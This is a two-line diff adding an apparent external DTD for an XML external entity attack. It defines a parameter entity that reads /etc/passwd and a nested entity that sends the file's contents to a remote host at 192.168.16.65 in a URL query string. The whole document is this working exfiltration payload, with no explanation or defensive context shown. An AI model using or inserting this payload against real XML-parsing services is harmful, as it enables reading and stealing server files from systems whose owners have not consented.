@@ -1,0 +1,2 @@
+<!ENTITY % payl SYSTEM "file:///etc/passwd">
+<!ENTITY % int "<!ENTITY % trick SYSTEM 'http://192.168.16.65:80/?p=%payl;'>"> 
